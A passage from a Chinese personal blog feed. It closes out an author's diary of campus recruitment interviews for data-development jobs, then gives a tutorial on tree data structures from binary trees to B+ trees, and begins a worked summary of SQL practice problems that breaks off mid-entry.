title="不知名小公司练不了手"></a>不知名小公司练不了手</h3><p>就在面快手的前后这段时间里，也面了一堆听都没听说过的小公司，不管是公司规模还是在数据开发领域其实都远比不上我在实习的公司（我实习的厂子虽小，但好歹是PC时代的直播霸主）。小公司的面试都过于简单了，而且很多公司流程上也很不规范（我遇到过技术面只有一面的，本来约了第二天技术面，结果HR一声不吭通知我晚上跟人力资源谈，我一脸懵逼，当晚才知道二面面试官没空所以不用面了。。。）</p><p>期间各种面试都感觉挺好，但是之后就没消息了（也可能是我报价太高了？？？）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211005172622.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="不对口岗位的面试"><a href="#不对口岗位的面试" class="headerlink" title="不对口岗位的面试"></a>不对口岗位的面试</h3><p>此外比较有名的公司里我还面了aftership和4399，但是这两个岗位都不对口</p><ul><li><p>aftership</p><p>笔试题太泛了，但涉及数据开发的都很简单</p><p>面试官问我想做数据开发还是数据分析，我说想做数据开发呀（这不岗位写的是数据开发我才投的嘛。。。）</p><p>面试官：“OK，那你回去等消息吧”（直接SQL题都不问了）</p><p>（我：“？？？”，后来从朋友那里了解到，这个是想招人同时做数据分析和数据开发。。。）</p></li><li><p>4399</p><p>笔试很简单</p><p>问项目实习，然后面试官问：“Java能写吗？”</p><p>我：“不能”</p><p>面试官：“那我没什么问题了”</p><p>（猝 ~ 4399的数据开发没有细分方向，所以岗位也不对口）</p></li></ul><p>到这里我秋招基本上处于放弃的状态了，天天跟朋友哭诉我面试又GG了</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211007025445.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="滑稽表演"><a href="#滑稽表演" class="headerlink" title="滑稽表演"></a>滑稽表演</h3><p>因为某些原因还是交了保研材料，答辩问英语和专业课（是的，我都不会）。老师们，我不秀一把还真以为你们教得很好了（其实以前我也有成为科学家的梦，想读硕读博并且混一段博后再留在高校，但在后来的经历里让我越来越厌倦了，我以前找了很多理由说服自己这样走，但后来认清现实……我觉得我不适合走这条路，虽然还没开始，但我已经不想走下去了），答辩像极了下面这张图：</p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211005171529.png" srcset="/img/loading.gif" lazyload="" width="70%"><p>结果当然是没保上，而且分数还很低，爆笑如雷了（nice~）</p><h3 id="三连败"><a href="#三连败" class="headerlink" title="三连败"></a>三连败</h3><p>在此之前，9月份对口岗位（aftership和4399不对口）的所有技术面我都是通过的，所以面完快手之后也没怎么准备了，觉得难度也就那样吧，再加上因为交保研申请材料的事情，费了很多时间，所以那段时间没刷题也没背八股。当我觉得9月份之后的秋招技术面不败记录能一直保持的时候，接下来的几轮面试把我啪啪打脸了。</p><ul><li><p>滴滴一面挂</p><p>面完快手之后我就处于摸鱼的状态，老实说滴滴不想去而且我以为会挺简单，所以9月17日直接约了第二天面试，结果面试的时候翻车了，八股算法SQL都不太行。。。</p></li><li><p>携程二面挂</p><p>笔试了携程，顺利约面试，一面过</p><p>二面聊人生：很魔幻的开局，没有自我介绍，对方也没开摄像头，上来就问我一个“数据分析”场景题（我：？？？）——感觉对方一开始就不要我的意思。他说看我这个本科生有两篇EI论文一作，很稀奇，所以捞了我简历（挺不自然的，有点像是被人当作稀奇动物在观看），聊着聊着面试官劝我读研，还建议我要练好表达（这个确实，诶）。。。</p><p>第二天看看状态：进人才池了。。。</p></li><li><p>网易互娱简历挂</p><p>网易互娱笔试选择题很简单，大题全A，然后被捞起来面了一顿，感觉对方都不会深入问（而且还一下子抛出三四个每个都需要回答很长的技术问题，我就没见过这样问的。。。）</p><p>然后另一个面试官问玩不玩游戏、假如过了能不能提前实习、为什么不想留实习公司。反问阶段我问了下对哪些游戏提供支持，回答：‘网易所有游戏”（懂了，网易互娱就是整个网易游戏，网易雷火不属于网易是吧？）；问数据团队人数，回答：“机密，不方便透露”（我第一次见这样的，问个人数都机密了）。。。</p><p>为什么说是简历挂呢，我感觉他这纯粹就是我笔试全A了不得不捞我面试，然后找个借口把我挂掉，比KPI面还恶心…</p><p>另外，我这个岗位里，网易互联网出的是测开的题，笔试挂；对网易雷火也没啥好感，没投（印象中是卡学历）</p><p>网易属实在秋招体验最差的公司，没有之一</p></li></ul><p>三连败之后麻了。。。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211005180827.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="守得云看见月明"><a href="#守得云看见月明" class="headerlink" title="守得云看见月明"></a>守得云看见月明</h3><p>9月中旬，在各个实习群或校招群里陆续有人OC（offer call）或者意向（录用意向书）了，而我……0 offer，打算准备秋招补录了</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004120239.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>9月底，我用了一天多的时间二刷了一遍牛客SQL，感觉最早刷的时候连解释都看不懂的题，现在可以秒了，但是想想自己还是0 offer就觉得很离谱</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211002020230.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>9月29日，当天下午我还在刷牛客SQL（虽然这里在刷题跟之前的面试结果完全没有关系，但是我觉得在达到目的之前保持继续肝的心态很重要）。看到面试快手同一个部门的群里有人OC了，然后挺紧张的，我就一直等着看看有没有电话打来，还记得当时心跳好快。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211005181214.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>十几分钟后看到有个北京打来的电话，我就知道快手面试过了，接电话之后果然是快手校招组打电话来告诉我通过了。</p><p>9月30日，收到快手录用意向书</p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211002014254.png" srcset="/img/loading.gif" lazyload="" width="30%"><p>腾讯校招是没有我这个岗位的，投过阿里云的某个团队但是方向不符合而且那个团队在我这个细分方向也不太行，字节笔试我应该是过不了了所以我就没投了。。。直接无缘BAT。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211004120324.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>我从实习到秋招这半年时间里，投递的数据开发岗位里，我面试过的知名互联网公司总共只有13家（我实习的公司、字节跳动、触宝科技、京东、虎牙、陌陌、快手、阿里巴巴、aftership、4399、滴滴、携程、网易），虽然其实有很多岗位是不匹配的，也有很多是注定了就不会招我的，但每一次的面试机会都挺难得，机不可失、失不再来。在我面试过的所有数据<strong>团队</strong>中，不管面试是否通过的（包括字节TikTok广告、京东集团数据服务、携程机票、阿里云Ecs弹性计算），无论是人员规模还是业界影响力都是快手这个团队最强（技术实力不清楚，但人数很大而且业界影响力都很强了，实力应该不会差吧），另外再综合这些公司开出的<strong>资薪</strong>，对我来说最好的offer就是这个喽，所以我已经很满意啦~</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211005181342.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="定格"><a href="#定格" class="headerlink" title="定格"></a>定格</h3><p>秋招的每一次日程我都会写在笔记上，最后的日程定格在这里</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211002000836.png" srcset="/img/loading.gif" lazyload="" width="60%"></p><h3 id="感言"><a href="#感言" class="headerlink" title="感言"></a>感言</h3><p>我问我实习公司的导师他当初为什么选择数据岗，他说：“我校招去的公司是技术岗统招的，当时数据部门缺人问我去不，我就去了”。。。我跟导师说：“我觉得让一个二十几岁的年轻人想明白一辈子要做什么，挺离谱的”，导师笑了笑。诶，很羡慕那些一开始就想明白自己要做什么的人，我是在大学里尝试了很多（想过做算法、前端、客户端、运维等，并且相应的技能我都去学过），在最后关头被选择了。</p><p>今年互联网秋招挺不容易的，互联网在线教育被打压（猿辅导、好未来、作业帮、高途这些以往校招规模还挺大的公司都受影响了）、滴滴下架（滴滴官网都不开校招了）、腾讯阿里助力共同富裕（大厂助力共同富裕是好事，但是羊毛出在羊身上，所以……）。我3月份决定找工作，中间还经历了转型阵痛，没有过人的天赋，也没有各种buff（科班、大厂实习、秋招备战方案、岗位招聘渠道信息等我都没有），在经历过多少毒打，才跟名校学生、研究生或者双非本科中的佼佼者为同一个名额竞争，9月份的很多个凌晨我不断告诫自己：“<strong>反复练习，几百道题和二十几万字的八股，在毕业前也终有一天会熟练的。</strong>”</p><p>在找实习到秋招中遇到过很多牛逼的人，比如：</p><p>在字节广告后端实习了一年多的985研究生；</p><p>在抖音实习但因为9月份才开始投递而错过秋招的同乡；</p><p>在腾讯转正后想养老故狂冲坡县和上海外企的Java后端大神；</p><p>有拿到百度offer后天天和我这个0 offer的人扯皮的隔壁专业同学；</p><p>同双非本卷数据开发，自学一周投字节客户端就卷到三面的老哥；</p><p>从18年开始每个暑假都在互联网公司实习的海外名校本硕大佬；</p><p>有本科在四大会计师事务所实习，后来转到算法岗实习，又再转到数据产品实习，最后拿下蚂蚁金服-数据研发的大哥</p><p>……</p><p>感觉每个人都很努力地奋斗，校招是一群即将成为“社会人”的学生在象牙塔里的最后一次拼搏……</p><p>很感谢秋招一起奋斗的伙伴们，也祝愿大家都拿到满意的offer</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211002015446.png" srcset="/img/loading.gif" lazyload="" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>我心里有B树</title>
      <link href="/2021/08/28/%E6%88%91%E5%BF%83%E9%87%8C%E6%9C%89B%E6%A0%91/"/>
      <url>/2021/08/28/%E6%88%91%E5%BF%83%E9%87%8C%E6%9C%89B%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p>介绍数据结构里的各种树</p><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>数据结构里，树是最考验也是最锻炼逻辑思维的。但是对我这种心里没B树的人来说，看到啥二叉树、二叉排序树、平衡二叉树、B树、B+树、B*树就一脸懵逼。在这里将逐一介绍各种树及其用途，从此成为心里有B树的人。</p><h2 id="树的一些概念"><a href="#树的一些概念" class="headerlink" title="树的一些概念"></a>树的一些概念</h2><ul><li><p>结点</p><p><strong>结点</strong>是数据结构中的基础，是构成复杂数据结构的基本组成单位。（有些也写作“节点”）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210828144643.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li><li><p>结点的度</p><p>度表示每个结点拥有的<strong>子树个数</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210828144703.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li><li><p>结点关系</p><ul><li>孩子结点：结点子树的根结点为该结点的<strong>孩子结点</strong>，例如上图B为A的孩子结点(也称作”子结点”或”子节点”)。</li><li>双亲结点：相应该结点称为孩子结点的<strong>双亲结点</strong>，例如上图A为B的双亲结点</li><li>兄弟结点： 同一个双亲结点的孩子结点之间互称<strong>兄弟结点</strong>，结点B与结点C互为兄弟结点。</li></ul></li><li><p>结点层次</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210828145422.png" srcset="/img/loading.gif" lazyload="" alt=""></p></li><li><p>树的高度（深度）</p><p>就是树的最大层数，例如上面的树高度为4</p></li></ul><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210828145911.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>这是一颗普通的二叉树，普通的二叉树具有如下特点：</p><p>1）每个结点最多有两颗子树，所以二叉树中不存在度大于2的结点。<br>2）左子树和右子树是有顺序的，次序不能任意颠倒。<br>3）即使树中某结点只有一棵子树，也要区分它是左子树还是右子树。</p><h2 id="二叉排序树"><a href="#二叉排序树" class="headerlink" title="二叉排序树"></a>二叉排序树</h2><p>二叉排序树又称为二叉查找树、二叉搜索树</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210828145903.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>二叉排序树的特点：左边比根节点小，右边比根节点大</p><p>但问题来了，有些情况例如：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210828150219.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>这其实也是个二叉排序树（确实左边节点的都比根节点小）</p><p>这种二叉排序树就退化成链表了</p><p>这个时候树的高度就很大了，树的高度很大并不利于一些查找，所以需要平衡树，在插入的时候同时调整这棵树，让他的节点尽可能均匀分布。</p><h2 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h2><p>红黑树是平衡树的一种，来看它的树结构</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210828150642.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>显然红黑树在努力的保证树的平衡性，这么做的主要目的是降低树的高度，因为树的查找性能取决于树的高度，因而通常二叉树越是平衡则查找性能越高。</p><h2 id="B树"><a href="#B树" class="headerlink" title="B树"></a>B树</h2><p>红黑树这种结构已经让树的高度很低了，那有没有办法让树的高度更低呢？</p><p>注意，红黑树还是<strong>二叉树</strong>的一种，它的每个节点的度不能大于2，即每个节点最多有2个子节点。</p><p>这个时候出现不讲武德的了：<strong>B树</strong>，它通常用在<strong>文件系统索引</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210828151557.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>为什么说它不讲武德呢，因为这个已经不是二叉树了（也是搜索树的一种，但不是二叉树了）。上图这是一个３路的B树，它的每个节点最多可以拥有３个孩子节点。</p><p>B树设计成多路的目的主要是进一步降低树的高度。虽说树的高度越低越好，但是如果无限所路的B树就退化成有序数组了：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210828151930.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>那按照之前这么说，树的高度越低查找性能越好，那有序数组查找性能岂不是最好？</p><p>注意，B树通常用在文件系统和数据库的索引，而这些索引一般是存在硬盘上的，在写入到硬盘之前需要加载到内存上，如果数据量太大，并不一定能一次性加载到内存中。所以，用有序数组来当索引其实并不合适，因为可能会撑爆内存。</p><p>这时候B树的多路存储的优越性就体现出来了，可以从根节点开始每次只加载B树的一个节点到内存，然后一步步往下找。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210828152556.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p><strong>在内存中，红黑树比B树效率更高；但在磁盘操作中，B树更优</strong></p><h2 id="B-树"><a href="#B-树" class="headerlink" title="B+树"></a>B+树</h2><p>B+树是以B树为基础的，它的<strong>数据都在叶子结点</strong>，同时叶子结点之间还加了指针形成列表。(如图，跟B树一样都是利用分治思想，但B+树的最下面一层的叶子结点就存着所有的数据了)</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210828152811.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>B+树通常较多用在<strong>数据库索引</strong>，因为select数据通常并不只select一条，通常会select很多条。如果是多条，B树需要做局部的中序遍历，可能需要跨层访问。而B+树由于所有数据都在叶子结点，所以不用跨层，同时由于有链表结构，只需要找到首尾，通过链表就能把所有数据取出来了。</p><p>例如从7找到19，B+树只需要在叶子结点中就能找到。而如果是B树，而可能要跑到上层根结点搜索。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210828153200.jpg" srcset="/img/loading.gif" lazyload="" alt=""></p><p>B+树的查找和树的高度有关，复杂度是$O( log(n) )$，如果用hash存储索引，平均时间复杂度是$O(1)$，但hash存储索引比B+树存储索引更优越仅仅局限于 select的数据为一条的时候，由于在数据库中通常是查询多条数据，所以数据库的索引较多用B+树而不是hash。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/vROSLrWv0gbKMi1rJT6eWA" target="_blank" rel="noopener">为什么MySQL数据库要用B+树存储索引？</a></p><p><a href="https://www.jianshu.com/p/bf73c8d50dc2" target="_blank" rel="noopener">深入学习二叉树(一) 二叉树基础</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL类型题总结</title>
      <link href="/2021/08/15/SQL%E7%B1%BB%E5%9E%8B%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2021/08/15/SQL%E7%B1%BB%E5%9E%8B%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p> 两万字牛客、leetcode的SQL题型总结</p><a id="more"></a><blockquote><p><strong>阅读提示：</strong></p><p>为了SQL语句的简洁和便于阅读，每道题中的子查询在下一步骤中可能用表别名表示而不全写出来</p><p>例如：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-comment">-- 子查询（表别名命名为a）</span><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> t<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> a <span class="hljs-comment">--这里的a表示上面的子查询，在SQL中这样是不可运行的，这里只是为了方便阅读</span><span class="hljs-comment">-- 正确写法（鉴于易读性，中间步骤通常不这样写，会写成像上面那样，只有最后的完整SQL语句才这样写出）</span><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> t) a</code></pre></div></blockquote><h2 id="累计求和"><a href="#累计求和" class="headerlink" title="累计求和"></a>累计求和</h2><h4 id="SQL60-统计salary的累计和running-total（较难）"><a href="#SQL60-统计salary的累计和running-total（较难）" class="headerlink" title="SQL60 统计salary的累计和running_total（较难）"></a><a href="https://www.nowcoder.com/practice/58824cd644ea47d7b2b670c506a159a6?tpId=82&amp;&amp;tqId=29828&amp;rp=1&amp;ru=/ta/sql&amp;qru=/ta/sql/question-ranking" target="_blank" rel="noopener"><strong>SQL60</strong> <strong>统计salary的累计和running_total</strong></a>（较难）</h4><blockquote><p>描述</p><p>按照salary的累计和running_total，其中running_total为前N个当前( to_date = ‘9999-01-01’)员工的salary累计和，其他以此类推。 具体结果如下Demo展示。。<br>CREATE TABLE <code>salaries</code> ( <code>emp_no</code> int(11) NOT NULL,<br><code>salary</code> int(11) NOT NULL,<br><code>from_date</code> date NOT NULL,<br><code>to_date</code> date NOT NULL,<br>PRIMARY KEY (<code>emp_no</code>,<code>from_date</code>));<br>输出格式:</p><table><thead><tr><th align="left">emp_no</th><th align="left">salary</th><th align="left">running_total</th></tr></thead><tbody><tr><td align="left">10001</td><td align="left">88958</td><td align="left">88958</td></tr><tr><td align="left">10002</td><td align="left">72527</td><td align="left">161485</td></tr><tr><td align="left">10003</td><td align="left">43311</td><td align="left">204796</td></tr><tr><td align="left">10004</td><td align="left">74057</td><td align="left">278853</td></tr></tbody></table></blockquote><p>根据题目描述，简单得说就是给定一个表，两个字段（emp_no，salary），按照emp_no进行排序，生成一个名为running_total的字段，该字段是salary的累计和。（WHERE s2.to_date = ‘9999-01-01’这个条件是牛客的奇葩条件，不过他这么说我们就这么写吧）</p><ul><li>方法一</li></ul><p>最朴素的解法就是来个自连接，原表简写为<code>s1</code>，再来一个表并命名为<code>s2</code>，并对<code>s2</code>的salary字段进行求和，这里有个关键的条件是<code>s2.emp_no &lt;= s1.emp_no</code>，这样就可以把范围限定在所在行从而实现累计求和了，SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-comment">-- 方法一（用另一个表来限定求和范围）</span><span class="hljs-keyword">SELECT</span> s1.emp_no, s1.salary,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">SUM</span>(s2.salary)<span class="hljs-keyword">FROM</span> salaries <span class="hljs-keyword">AS</span> s2<span class="hljs-keyword">WHERE</span> s2.emp_no &lt;= s1.emp_no<span class="hljs-keyword">AND</span> s2.to_date = <span class="hljs-string">'9999-01-01'</span>) <span class="hljs-keyword">AS</span> running_total<span class="hljs-keyword">FROM</span> salaries <span class="hljs-keyword">AS</span> s1<span class="hljs-keyword">WHERE</span> s1.to_date = <span class="hljs-string">'9999-01-01'</span><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> s1.emp_no</code></pre></div><ul><li>方法二</li></ul><p>上面这种方法比较原始，SQL也提供了开窗函数（或称作窗口函数）来实现这样的功能，<code>SUM+OVER</code>可以达到开窗函数的功能，SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-comment">-- 方法二（开窗函数）</span><span class="hljs-keyword">SELECT</span> emp_no,salary,<span class="hljs-keyword">SUM</span>(salary) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> emp_no) <span class="hljs-keyword">AS</span> running_total<span class="hljs-keyword">FROM</span> salaries<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">to_date</span> = <span class="hljs-string">'9999-01-01'</span></code></pre></div><h4 id="SQL71-牛客每个人最近的登录日期-六-（较难）"><a href="#SQL71-牛客每个人最近的登录日期-六-（较难）" class="headerlink" title="SQL71 牛客每个人最近的登录日期(六)（较难）"></a><a href="https://www.nowcoder.com/practice/572a027e52804c058e1f8b0c5e8a65b4?tpId=82&amp;&amp;tqId=35089&amp;rp=1&amp;ru=/activity/oj&amp;qru=/ta/sql/question-ranking" target="_blank" rel="noopener"><strong>SQL71</strong> <strong>牛客每个人最近的登录日期(六)</strong></a>（较难）</h4><blockquote><p>描述</p><p>牛客每天有很多人登录，请你统计一下牛客每个用户查询刷题信息，包括: 用户的名字，以及截止到某天，累计总共通过了多少题。 不存在没有登录却刷题的情况，但是存在登录了没刷题的情况，不会存在刷题表里面，有提交代码没有通过的情况，但是会记录在刷题表里，只不过通过数目是0。<br>有一个登录(login)记录表，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200820/557336_1597903934415_A5E822A1E15CEBC7E16183ECD9D7CC7A" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示user_id为2的用户在2020-10-12使用了客户端id为1的设备登录了牛客网<br>。。。<br>第5行表示user_id为3的用户在2020-10-13使用了客户端id为2的设备登录了牛客网</p><p>有一个刷题（passing_number)表，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200820/557336_1597903944909_9C60ECB78BE56145269BDFA74F1074D3" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示user_id为2的用户在2020-10-12通过了4个题目。<br>。。。<br>第3行表示user_id为1的用户在2020-10-13提交了代码但是没有通过任何题目。<br>第4行表示user_id为4的用户在2020-10-13通过了2个题目</p><p>还有一个用户(user)表，简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20200820/557336_1597903952301_4763AF7B377AF42CB5A87C53B965DC45" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>请你写出一个sql语句查询刷题信息，包括: 用户的名字，以及截止到某天，累计总共通过了多少题，并且查询结果先按照日期升序排序，再按照姓名升序排序，有登录却没有刷题的哪一天的数据不需要输出，上面的例子查询结果如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20201015/557336_1602736313104_6BE4C7264FB9F7CED1DD6A6D44652D6C" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>查询结果表明:<br>fh在2020-10-12为止，总共通过了4道题，输出为4<br>wangchao在2020-10-12为止，总共通过了1道题，总计为1<br>tm在2020-10-12为止只登陆了没有刷题，故没有显示出来<br>tm在2020-10-13为止刷了题，但是却没有通过任何题目，总计为0<br>wangchao在2020-10-13通过2道，但是加上前面2020-10-12通过1道，故在2020-10-13为止总共通过了3道题，总计为3</p></blockquote><p>还是排序，但是这里需要先分区再排序</p><ol><li><p>分组排序</p><p><code>SELECT user_id,date,SUM(number) OVER(PARTITION BY user_id ORDER BY user_id,date) FROM passing_number</code></p><p>这样基本上就完成的差不多了</p></li><li><p><code>JOIN</code>连接，将 user_id 替换成 user_name</p></li><li><p><code>ORDER BY</code>排序</p></li></ol><p>完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> user.name,<span class="hljs-built_in">date</span>,<span class="hljs-keyword">SUM</span>(<span class="hljs-built_in">number</span>) <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> user_id <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> user_id,<span class="hljs-built_in">date</span>) <span class="hljs-keyword">FROM</span> passing_number<span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">ON</span> passing_number.user_id = user.id<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">date</span>,user.name</code></pre></div><h2 id="自连接"><a href="#自连接" class="headerlink" title="自连接"></a>自连接</h2><h4 id="SQL73-考试分数-二-（中等）"><a href="#SQL73-考试分数-二-（中等）" class="headerlink" title="SQL73 考试分数(二)（中等）"></a><a href="https://www.nowcoder.com/practice/f456dedf88a64f169aadd648491a27c1?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL73</strong> <strong>考试分数(二)</strong></a>（中等）</h4><blockquote><p>描述</p><p>牛客每次考试完，都会有一个成绩表(grade)，如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210204/557336_1612434140530/A40EBCABDBC68539EE224EE1DC2A7FE7" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示用户id为1的用户选择了C++岗位并且考了11001分</p><p>。。。</p><p>第8行表示用户id为8的用户选择了前端岗位并且考了9999分</p><p>请你写一个sql语句查询用户分数大于其所在工作(job)分数的平均分的所有grade的属性，并且以id的升序排序，如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210204/557336_1612434164748/393D7F7211F18AF58DCC405ABAAB04DD" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>(注意: sqlite 1/2得到的不是0.5，得到的是0，只有1*1.0/2才会得到0.5，sqlite四舍五入的函数为round)</p></blockquote><ol><li><p>先求出每个岗位的平均分</p><blockquote><p>– 子查询（平均分）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">AVG</span>(score) <span class="hljs-keyword">AS</span> score <span class="hljs-keyword">FROM</span> grade<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job</code></pre></div></blockquote></li><li><p>表连接</p><p><code>JOIN</code>连接两个表之后，相当于把两个表拼接，那么子查询就相当于是一个字段了</p></li><li><p>WHERE 条件过滤</p><p><code>a.score &gt; b.score</code></p></li></ol><p>完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,a.job,a.score <span class="hljs-keyword">FROM</span> grade a<span class="hljs-keyword">JOIN</span> (    <span class="hljs-keyword">SELECT</span> job,<span class="hljs-keyword">AVG</span>(score) <span class="hljs-keyword">AS</span> score <span class="hljs-keyword">FROM</span> grade    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job) b<span class="hljs-keyword">ON</span> a.job = b.job<span class="hljs-keyword">WHERE</span> a.score &gt; b.score<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span></code></pre></div><h4 id="SQL86-实习广场投递简历分析-三-（困难）"><a href="#SQL86-实习广场投递简历分析-三-（困难）" class="headerlink" title="SQL86 实习广场投递简历分析(三)（困难）"></a><a href="https://www.nowcoder.com/practice/83f84aa5c32b4cf5a75558d02dd7743c?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1" target="_blank" rel="noopener"><strong>SQL86</strong> <strong>实习广场投递简历分析(三)</strong></a>（困难）</h4><blockquote><p>描述</p><p>在牛客实习广场有很多公司开放职位给同学们投递，同学投递完就会把简历信息存到数据库里。</p><p>现在有简历信息表(resume_info)，部分信息简况如下:</p><p><img src="https://uploadfiles.nowcoder.com/images/20210305/301499_1614930662852/E587507D0FC15C77027A0B0E39B12F10" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>第1行表示，在2025年1月2号，C++岗位收到了53封简历</p><p>。。。</p><p>最后1行表示，在2027年2月6号，C++岗位收到了231封简历</p><p>请你写出SQL语句查询在2025年投递简历的每个岗位，每一个月内收到简历的数目，和对应的2026年的同一个月同岗位，收到简历的数目，最后的结果先按first_year_mon月份降序，再按job降序排序显示，以上例子查询结果如下:</p><p><img 